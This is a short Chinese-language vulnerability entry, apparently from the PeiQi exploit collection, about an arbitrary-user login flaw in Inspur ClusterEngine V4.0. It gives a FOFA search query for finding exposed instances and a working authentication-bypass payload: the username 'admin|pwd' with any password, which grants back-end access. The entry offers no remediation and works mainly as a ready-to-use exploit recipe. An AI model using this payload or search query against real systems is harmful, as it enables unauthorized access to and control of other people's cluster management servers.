---
title: 浪潮ClusterEngineV4.0 任意用户登录漏洞
date: 2021-09-23 23:55:51
tags: PeiQi文库
categories:
 - Web应用漏洞
 - 浪潮
---

# 浪潮ClusterEngineV4.0 任意用户登录漏洞

## 漏洞描述

浪潮ClusterEngineV4.0 存在任意用户登录漏洞，构造恶意的用户名和密码即可获取后台权限

## 漏洞影响

> [!NOTE]
>
> 浪潮ClusterEngineV4.0

## FOFA

> [!NOTE]
>
> title="TSCEV4.0"

## 漏洞复现

登录页面如下

![](/img/20210924013613034098.png)

```
USER： admin|pwd
PASS:  任意
```

成功登陆后台

> [!NOTE]
>
> 部分功能是无法使用的

![](/img/20210924013613497063.png)